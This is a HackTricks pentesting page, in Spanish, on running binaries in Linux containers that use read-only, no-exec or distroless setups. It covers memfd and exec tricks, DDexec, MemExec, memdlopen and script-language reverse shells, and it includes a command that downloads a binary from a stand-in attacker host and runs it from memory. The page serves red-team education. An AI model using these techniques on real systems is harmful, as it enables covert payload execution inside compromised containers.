# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Videos

En los siguientes vídeos puedes encontrar las técnicas mencionadas en esta página explicadas con más detalle:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Es cada vez más común encontrar máquinas Linux montadas con protección de sistema de archivos **read-only (ro)**, especialmente en contenedores. Esto es porque ejecutar un contenedor con el sistema de archivos en ro es tan fácil como establecer **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, incluso si el sistema de archivos está montado como ro, **`/dev/shm`** seguirá siendo escribible, por lo que no es cierto que no podamos escribir nada en el disco. No obstante, esta carpeta estará **montada con la protección no-exec**, por lo que si descargas un binario aquí **no podrás ejecutarlo**.

> [!WARNING]
> Desde una perspectiva de red team, esto complica **descargar y ejecutar** binarios que no estén ya en el sistema (como backdoors o enumerators como `kubectl`).

## Easiest bypass: Scripts

Ten en cuenta que he mencionado binarios: puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **shell script** si `sh` está presente o un **python** **script** si `python` está instalado.

Sin embargo, esto no es suficiente para ejecutar tu backdoor binario u otras herramientas binarias que puedas necesitar ejecutar.

## Memory Bypasses

Si quieres ejecutar un binario pero el sistema de archivos no lo permite, la mejor manera de hacerlo es **ejecutándolo desde memoria**, ya que las **protecciones no se aplican ahí**.

### FD + exec syscall bypass

Si tienes motores de scripting potentes dentro de la máquina, como **Python**, **Perl**, o **Ruby**, podrías descargar el binario para ejecutarlo desde memoria, almacenarlo en un file descriptor de memoria (`create_memfd` syscall), que no estará sujeto a esas protecciones, y luego llamar a un **`exec` syscall** indicando el **fd como el archivo a ejecutar**.

Para esto puedes usar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Le pasas un binario y generará un script en el lenguaje indicado con el **binario comprimido y b64 codificado** con las instrucciones para **decodificar y descomprimirlo** en un **fd** creado llamando al syscall `create_memfd` y una llamada al syscall **exec** para ejecutarlo.

> [!WARNING]
> Esto no funciona en otros lenguajes de scripting como PHP o Node porque no tienen ninguna d**efault way to call raw syscalls** desde un script, por lo que no es posible llamar a `create_memfd` para crear el **memory fd** donde almacenar el binario.
>
> Además, crear un **fd regular** con un archivo en `/dev/shm` no funcionará, ya que no te permitirá ejecutarlo porque la protección **no-exec** se aplicará.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que te permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, **controlando el código assembly** que se está ejecutando en el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

> [!TIP]
> **DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binario** desde **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para más información sobre esta técnica consulta el Github o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el paso natural siguiente de DDexec. Es un **DDexec shellcode demonised**, así que cada vez que quieras **run a different binary** no necesitas relanzar DDexec; puedes ejecutar el shellcode de memexec vía la técnica DDexec y luego **communicate with this deamon to pass new binaries to load and run**.

Puedes encontrar un ejemplo de cómo usar **memexec to execute binaries from a PHP reverse shell** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar a DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) la técnica permite una **easier way to load binaries** en memoria para ejecutarlos más tarde. Incluso podría permitir cargar binaries con dependencias.

## Distroless Bypass

Para una explicación dedicada de **what distroless actually is**, cuándo ayuda, cuándo no, y cómo cambia el post-exploitation tradecraft en containers, consulta:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Los contenedores distroless contienen solo los **bare minimum components necessary to run a specific application or service**, como bibliotecas y dependencias de runtime, pero excluyen componentes más grandes como un package manager, shell o utilidades del sistema.

El objetivo de los contenedores distroless es **reduce the attack surface of containers by eliminating unnecessary components** y minimizar el número de vulnerabilidades que puedan ser explotadas.

### Reverse Shell

En un contenedor distroless puede que **ni siquiera encuentres `sh` o `bash`** para obtener un shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

> [!WARNING]
> Por lo tanto, **no** podrás obtener un **reverse shell** ni **enumerate** el sistema como lo haces habitualmente.

Sin embargo, si el contenedor comprometido ejecuta por ejemplo una web en flask, entonces python está instalado, y por tanto puedes obtener un **Python reverse shell**. Si está ejecutando node, puedes obtener un Node rev shell, y lo mismo con prácticamente cualquier **scripting language**.

> [!TIP]
> Usando el scripting language podrías **enumerate the system** aprovechando las capacidades del lenguaje.

Si no existen protecciones **`read-only/no-exec`** podrías abusar de tu reverse shell para **write in the file system your binaries** y **execute** them.

> [!TIP]
> Sin embargo, en este tipo de contenedores estas protecciones normalmente existirán, pero podrías usar las **previous memory execution techniques to bypass them**.

Puedes encontrar ejemplos sobre cómo **exploit some RCE vulnerabilities** para obtener **scripting languages reverse shells** y ejecutar binaries desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
